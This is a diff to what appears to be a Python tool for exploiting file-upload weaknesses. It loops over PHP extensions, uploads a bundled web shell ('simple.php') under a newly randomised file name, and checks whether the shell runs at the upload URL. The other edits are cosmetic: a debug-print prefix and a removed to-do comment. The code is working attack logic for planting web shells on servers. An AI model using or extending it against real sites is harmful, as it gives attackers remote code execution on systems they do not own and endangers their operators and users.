@@ -24,7 +24,6 @@ from argparse import RawTextHelpFormatter
 #   htaccess module
 #   .COM payload
 #   Add --level
-#   prints, cli args and default shell loc
 
 # Set of colors
 red = '\u001b[31;1m'
@@ -96,7 +95,7 @@ def debug(message, verbosity=None):
     if (verbosity != None):
         if (verbosity > options.global_verbosity):
             return
-
+    print("[?] ", end="")
     print(message)
 
 def exit_success(url):
@@ -562,7 +561,8 @@ def main():
         for accepted_php_extension in accepted_php_extensions:
             info(f"Trying to upload .{accepted_php_extension} shell...")
             with open("assets/shells/simple.php", 'rb') as file: file_data = file.read()
-            response, session, headers, url, file_name = upload(options.request_file, session, file_data, f".{accepted_php_extension}", "application/x-httpd-php")
+            file_name = generate_random_string(10) + f".{accepted_php_extension}"
+            response, session, headers, url, file_name = upload(options.request_file, session, file_data, file_name, "application/x-httpd-php")
             if (check_success(response)):
                 success("Shell successfully uploaded")
                 if (check_shell(upload_url + file_name) == True):
